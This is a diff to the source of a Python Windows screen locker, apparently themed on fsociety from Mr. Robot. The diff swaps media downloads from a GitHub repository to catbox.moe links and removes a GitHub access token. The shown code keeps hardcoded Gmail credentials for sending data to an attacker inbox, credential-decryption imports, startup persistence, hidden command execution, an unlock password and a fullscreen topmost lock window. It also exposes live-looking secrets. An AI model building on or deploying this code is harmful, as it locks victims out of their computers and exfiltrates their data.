@@ -20,16 +20,15 @@ import sqlite3, win32crypt, shutil, winreg, ctypes
 PASSWORD = "1601"
 MAX_ATTEMPTS = 4
 TIMER_FILE = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), "Microsoft", "Windows", "timer.dat")
-TOKEN = "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"
 GMAIL_LOGIN = "xzx78848@gmail.com"
 GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
-VIDEO_URL = f"https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/fuxEcorp.mp4.mp4?token={TOKEN}"
-LOGO_URL = f"https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/logo.png?token={TOKEN}"
-LOCKER_MUSIC_URL = f"https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc).mp3?token={TOKEN}"
-VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp4")
-LOGO_PATH = os.path.join(tempfile.gettempdir(), "logo.png")
-LOCKER_MUSIC_PATH = os.path.join(tempfile.gettempdir(), "Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc).mp3")
+VIDEO_URL = "https://files.catbox.moe/jgh9xd.mp4"
+LOCKER_MUSIC_URL = "https://files.catbox.moe/ejpe8e.mp3"
+LOGO_URL = "https://files.catbox.moe/dzxxzn.jpg"
+VIDEO_PATH = os.path.join(tempfile.gettempdir(), "video.mp4")
+LOCKER_MUSIC_PATH = os.path.join(tempfile.gettempdir(), "locker_music.mp3")
+LOGO_PATH = os.path.join(tempfile.gettempdir(), "logo.jpg")
 attempts_left = MAX_ATTEMPTS
 
 def run_hidden(cmd):
@@ -158,12 +157,8 @@ def add_to_startup():
 def download_file(url, path):
     try:
         if os.path.exists(path): os.remove(path)
-        req = urllib.request.Request(url)
-        req.add_header("Authorization", f"token {TOKEN}")
         urllib.request.urlretrieve(url, path)
-    except:
-        try: urllib.request.urlretrieve(url, path)
-        except: pass
+    except: pass
 
 def anim_fsociety():
     a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
